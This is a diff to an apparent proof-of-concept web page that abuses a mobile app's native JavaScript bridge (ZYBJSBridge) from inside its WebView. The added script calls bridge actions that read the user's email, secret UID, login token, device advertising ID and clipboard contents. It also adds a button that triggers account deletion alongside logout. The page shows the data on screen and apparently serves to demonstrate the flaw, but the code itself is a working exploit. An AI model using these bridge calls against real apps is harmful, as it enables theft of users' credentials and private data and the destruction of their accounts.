@@ -52,18 +52,20 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
-    <p style="font-size: 15px;" id="Timezone"></p>
+
+    <p style="font-size: 15px;" id="EMail"></p>
+    <p style="font-size: 15px;" id="SecretUID"></p>
     <p style="font-size: 15px;" id="Token"></p>
     <p style="font-size: 15px;" id="CUID"></p>
     <p style="font-size: 15px;" id="District"></p>
+    <p style="font-size: 15px;" id="Timezone"></p>
+
+    
 
     <p style="font-size: 15px;" id="AccountAvatarText">Your Avatar: </p>
     <div class="image-with-text">
         <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
     </div>
-    
-    
-    
 
     <p><span class="larger">Get Your Device Info:</span></p>
     <p style="font-size: 15px;" id="IDFA"></p>
@@ -75,6 +77,9 @@
 
     <p><span class="larger">Log Out Your Account:</span></p>
     <input type="button" value="Log Out" id="LogOut" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <p><span class="larger">Delete Your Account:</span></p>
+    <input type="button" value="Delete Account" id="DeleteAccount" style="font-size: 20px; padding: 20px 25px;"/>
 
     <br><br>
     <script>
@@ -88,6 +93,15 @@
                 document.getElementById("CUID").innerText = "Your CUID: \n" + json.data.cuid;
                 document.getElementById("District").innerText = "Your District: " + json.data.localDistrict;
                 document.getElementById("Timezone").innerText = "Your Timezone: " + json.data.localTimezone.replace("\/", "/");
+                break;
+            case "cb_common":
+                document.getElementById("IDFA").innerText = "Your DeviceID (IDFA): \n" + json.data.devid;
+                break;
+            case "cb_getClipboardContent":
+                document.getElementById("ClipBoardText").innerText = json.data.content;
+                break;
+            case "cb_getUserInfo":
+                document.getElementById("SecretUID").innerText = "Your SecretUID: \n" + json.data.secretUid;
                 break;
         }
     };
@@ -109,6 +123,24 @@
         "param":{},
         "callbackKey":"cb_getUserInfo"
     }));
+
+    document.getElementById("DeleteAccount").onclick = function () {
+        window.webkit.messageHandlers.ZYBJSBridge.postMessage(JSON.stringify({
+            "action":"deleteAccount",
+            "param":{},
+            "callbackKey":"cb_deleteAccount"
+        }));
+    }
+
+    document.getElementById("AccessClipBoard").onclick = function () {
+        window.webkit.messageHandlers.ZYBJSBridge.postMessage(JSON.stringify({
+            "action":"getClipboardContent",
+            "param":{},
+            "callbackKey":"cb_getClipboardContent"
+        }));
+    }
+
+
 
 
 
